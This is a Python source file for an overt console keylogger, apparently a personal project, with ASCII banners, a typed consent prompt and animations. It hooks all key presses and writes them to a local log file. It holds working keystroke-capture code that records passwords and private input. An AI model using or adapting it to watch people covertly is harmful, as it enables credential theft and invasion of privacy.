import keyboard
import time
import sys
from datetime import datetime
import random

class Animations:
    @staticmethod
    def spinning_cursor():
        while True:
            for cursor in '|/-\\':
                yield cursor

    @staticmethod
    def typing_animation():
        animations = [
            "(•_•)",
            "( •_•)>⌐■-■",
            "(⌐■_■)"
        ]
        while True:
            for frame in animations:
                yield frame
            for frame in reversed(animations[1:]):
                yield frame

    @staticmethod
    def warning_sign():
        signs = [
            "⚠️ ",
            "‼️ ",
            "⛔ "
        ]
        while True:
            for sign in signs:
                yield sign

def display_banner():
    print(r"""
     /$$   /$$  /$$$$$$  /$$$$$$$$ /$$$$$$$$  /$$$$$$  /$$    /$$ /$$$$$$$$ /$$$$$$$ 
    | $$  | $$ /$$__  $$|__  $$__/| $$_____/ /$$__  $$| $$   | $$| $$_____/| $$__  $$
    | $$  | $$| $$  \ $$   | $$   | $$      | $$  \ $$| $$   | $$| $$      | $$  \ $$
    | $$$$$$$$| $$$$$$$$   | $$   | $$$$$   | $$  | $$|  $$ / $$/ | $$$$$   | $$$$$$$/
    | $$__  $$| $$__  $$   | $$   | $$__/   | $$  | $$ \  $$ $$/  | $$__/   | $$__  $$
    | $$  | $$| $$  | $$   | $$   | $$      | $$  | $$  \  $$$/   | $$      | $$  \ $$
    | $$  | $$| $$  | $$   | $$   | $$$$$$$$|  $$$$$$/   \  $/    | $$$$$$$$| $$  | $$
    |__/  |__/|__/  |__/   |__/   |________/ \______/     \_/     |________/|__/  |__/
    """)
    
    print("\n" + "="*80)
    print("Created by: Piyush Singh")
    print("GitHub: https://github.com/piyushsiingh")
    print("Contact: piyush.siingh2005@gmail.com")
    print("="*80 + "\n")

def ethical_warning():
    warning = Animations.warning_sign()
    for _ in range(10):
        sys.stdout.write(f"\r{next(warning)} ETHICAL WARNING: This keylogger requires explicit consent! {next(warning)}")
        sys.stdout.flush()
        time.sleep(0.2)
    print("\n")

def get_ethical_consent():
    spinner = Animations.spinning_cursor()
    typing = Animations.typing_animation()
    
    for _ in range(3):
        sys.stdout.write(f"\rInitializing {next(spinner)}  {next(typing)}")
        sys.stdout.flush()
        time.sleep(0.5)
    
    print("\n\n")
    consent = input("""
    ⚠️  LEGAL AND ETHICAL DISCLOSURE  ⚠️
    
    This program will:
    - Record ALL keyboard input
    - Save it to a log file
    - Potentially capture sensitive information
    
    By proceeding you confirm:
    1. You have explicit consent from all monitored users
    2. You are authorized to monitor the target system
    3. You will use this only for legal purposes
    
    Type 'I CONFIRM' to proceed or anything else to quit: """)
    
    return consent.strip().upper() == "I CONFIRM"

def on_key_press(event):
    with open("keystroke_log.txt", "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
        
        # Handle special keys
        if event.name == "space":
            log_entry = " "
        elif event.name == "enter":
            log_entry = "\n"
        elif event.name == "backspace":
            log_entry = "[BACKSPACE]"
        elif len(event.name) > 1:
            log_entry = f"[{event.name.upper()}]"
        else:
            log_entry = event.name
        
        f.write(log_entry)
        
        # Animation for logging
        sys.stdout.write(f"\rLogging... {random.choice(['▁','▂','▃','▄','▅','▆','▇','█'])}")
        sys.stdout.flush()

def ask_to_continue():
    while True:
        choice = input("\n\nDo you want to continue logging? (yes/no): ").strip().lower()
        if choice in ['yes', 'y']:
            return True
        elif choice in ['no', 'n']:
            return False
        else:
            print("Please enter 'yes' or 'no'.")

def main_loop():
    # Animation while waiting for keys
    spinner = Animations.spinning_cursor()
    keyboard.on_press(on_key_press)
    
    print("\nPress ESC to pause logging...\n")
    print("Active logging (ESC to pause):", end=" ")
    
    try:
        while True:
            sys.stdout.write(f"\rActive logging (ESC to pause): {next(spinner)}")
            sys.stdout.flush()
            time.sleep(0.1)
            if keyboard.is_pressed('esc'):
                raise KeyboardInterrupt
    except KeyboardInterrupt:
        keyboard.unhook_all()
        print("\n\nLogging paused.")
        return True  # Indicate we should ask to continue

def main():
    display_banner()
    ethical_warning()
    
    if not get_ethical_consent():
        print("\nKeylogger terminated - consent not confirmed")
        sys.exit(0)
    
    print("\nStarting keylogger with consent...")
    
    while True:
        should_continue = main_loop()
        if not should_continue or not ask_to_continue():
            break
    
    # Shutdown animation
    print("\nStopping keylogger...")
    for i in range(5, 0, -1):
        sys.stdout.write(f"\rShutting down in {i}... {'!'*i}")
        sys.stdout.flush()
        time.sleep(0.5)
    
    print("\n\nKeylogger stopped. Log file saved to keystroke_log.txt")
    print("Remember to handle logged data responsibly!")
    print("\nCredits:")
    print("-"*50)
    print("Created by Piyush Singh")
    print("GitHub: https://github.com/piyushsiingh")
    print("Email: piyush.siingh2005@gmail.com")
    print("-"*50)

if __name__ == "__main__":
    main()
